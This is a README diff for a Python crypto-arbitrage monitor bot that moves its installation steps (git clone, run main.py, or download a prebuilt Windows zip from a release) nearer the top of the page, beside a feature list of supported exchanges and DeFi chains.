@@ -7,6 +7,25 @@ Arbitrage Monitor Bot is a powerful Python-based tool designed to identify and e
 
 You can see all 3 different types of arbitrage opportunities live by just running the bot without making any connections. By clicking on the link next to the arbitrage opportunities, you can open the trading pages of the relevant trading pairs directly with a single click.
 
+
+## 🛠️ Installation & Setup
+
+For Windows (CMD):
+```bash
+git clone https://github.com/CryptoArbBot/Multi-Arbitrage-Monitor.git
+cd Multi-Arbitrage-Monitor
+python main.py
+```
+The second option for Windows operating systems is to run the packaged application directly:
+[Windows 10/11 One Click App](https://github.com/CryptoArbBot/Multi-Arbitrage-Monitor/releases/download/3.2/CryptoArbMonitor.zip)
+
+For Macos (Terminal):
+```bash
+git clone https://github.com/CryptoArbBot/Multi-Arbitrage-Monitor.git
+cd Multi-Arbitrage-Monitor
+python3 main.py
+```
+
 ## Features
 - **Multi-Exchange Support:** Monitors arbitrage opportunities across the 10 largest centralized exchanges (e.g., Binance, Coinbase, Kraken, KuCoin, OKX, Bybit, Bitfinex, Huobi, Gate.io, Crypto.com).
 - **DeFi Arbitrage:** Detects price differences between swap and liquidity pools on Solana and Ethereum L2s (e.g., Arbitrum, Optimism, Polygon, zkSync).
@@ -35,23 +54,6 @@ The profit potential depends on market volatility, liquidity, and execution spee
 
 > **Note:** Actual profits may vary. All trading involves risk, and past performance is not indicative of future results.
 
-## 🛠️ Installation & Setup
-
-For Windows (CMD):
-```bash
-git clone https://github.com/CryptoArbBot/Multi-Arbitrage-Monitor.git
-cd Multi-Arbitrage-Monitor
-python main.py
-```
-The second option for Windows operating systems is to run the packaged application directly:
-[Windows 10/11 One Click App](https://github.com/CryptoArbBot/Multi-Arbitrage-Monitor/releases/download/3.2/CryptoArbMonitor.zip)
-
-For Macos (Terminal):
-```bash
-git clone https://github.com/CryptoArbBot/Multi-Arbitrage-Monitor.git
-cd Multi-Arbitrage-Monitor
-python3 main.py
-```
 - You can see all 3 different types of arbitrage opportunities live by just running the bot without making any connections. 
 - By clicking on the link next to the arbitrage opportunities, you can open the trading pages of the relevant trading pairs directly with a single click.
 - Configure your API keys and preferences in the via dashboard.
